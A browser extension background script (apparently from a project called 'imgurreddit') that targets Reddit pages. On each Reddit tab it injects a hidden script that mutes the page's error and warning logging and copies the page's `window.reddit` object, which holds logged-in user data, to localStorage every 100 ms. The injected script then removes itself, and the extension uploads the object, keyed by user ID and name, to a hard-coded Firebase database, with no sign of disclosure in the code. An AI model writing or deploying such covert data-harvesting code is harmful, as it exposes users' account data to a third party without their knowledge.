var config = {
    apiKey: "AIzaSyA_-Qv1YXYfIMqEoaYhfsljZ_PzOb6GAt4",
    authDomain: "imgurreddit-59dd3.firebaseapp.com",
    databaseURL: "https://imgurreddit-59dd3.firebaseio.com",
    projectId: "imgurreddit-59dd3",
    storageBucket: "imgurreddit-59dd3.appspot.com",
    messagingSenderId: "772446851764"
};
firebase.initializeApp(config);
let injectedCode = `
var myScript = document.createElement('script');
myScript.id = 'myScript';
myScript.innerHTML = \`
if(!window.intervals){
    window.intervals = [];
}
window.r.error = function(){};
window.r.warn = function(){};
if(document.querySelector('#myTimer')){
    clearInterval(document.querySelector('#myTimer').valueAsNumber);
    document.querySelector('#myTimer').parentElement.removeChild(document.querySelector('#myTimer'));
}
function updateRedditJSON(){
    localStorage.setItem('myReddit',JSON.stringify(window.reddit));
}
var intervalInfo = {
    func:updateRedditJSON,
    time:100
};
var timerID = setInterval(intervalInfo.func, intervalInfo.time);
window.intervals.push({timerID:timerID, info:intervalInfo});
var createTimer = document.createElement('input');
createTimer.setAttribute('type', 'number');
createTimer.setAttribute('id', 'myTimer');
createTimer.setAttribute('value', timerID);
document.body.appendChild(createTimer);
document.body.removeChild(document.querySelector('#myScript'));
\`;
myScript.setAttribute('hidden', true);
document.body.appendChild(myScript);
localStorage.getItem('myReddit');
`;
//`
// chrome.runtime.sendMessage('${chrome.extension.getURL("")}',{
//     reddit: window.reddit
// },{},function(){
//     console.log(...arguments);
// });`;
let reddit;
function updateReddit(REDDIT){
    reddit = REDDIT;
    if(reddit.logged){
        firebase.database().ref(`users/${reddit.user_id}`).update({
            name: reddit.logged,
            data: reddit
        });
    }
}
// function getWindow(message,sender,sendResponse){
//     console.log(message, sender, sendResponse);
//     alert(1);
// }
function checkIfReddit(tab, tabID){
    if( tab.url.startsWith('https://reddit.com')    ||
        tab.url.startsWith('http://reddit.com')     ||
        tab.url.startsWith('https://www.reddit.com')||
        tab.url.startsWith('http://www.reddit.com')){
        // chrome.runtime.onMessage.addListener(getWindow);
        // chrome.runtime.onMessageExternal.addListener(getWindow);
        console.log('on reddit');
        chrome.tabs.executeScript(tabID, {
            code: injectedCode
        },function(REDDIT_STRING){
            updateReddit(JSON.parse(REDDIT_STRING));
        });
    }else{
        console.log('not on reddit');
    }
}
chrome.tabs.onActiveChanged.addListener(function(tabID){
    chrome.tabs.get(tabID, function(windowInfo){
        checkIfReddit(windowInfo, tabID);
    });
});

chrome.tabs.onUpdated.addListener(function(tabID){
    chrome.tabs.get(tabID, function(windowInfo){
        checkIfReddit(windowInfo, tabID);
    });
});